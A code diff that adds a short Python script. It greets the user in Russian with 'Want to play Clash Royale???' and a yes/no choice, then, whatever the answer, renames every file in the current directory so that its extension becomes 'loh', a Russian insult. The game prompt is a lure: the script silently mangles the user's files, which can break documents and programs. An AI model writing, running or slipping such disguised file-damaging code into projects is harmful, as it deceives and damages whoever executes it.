@@ -1,0 +1,11 @@
+import sys
+import os
+hck = int(input("Хочешь поиграть в клеш рояль???\n1 - Да,\n2 - Нет\n"))
+for f in os.listdir("."):
+	print(f)
+	n = f.rfind(".")
+	if n == -1:
+		res = f + "loh"
+	else:
+		res = f[:n+1] + "loh"
+	os.rename(f, res)
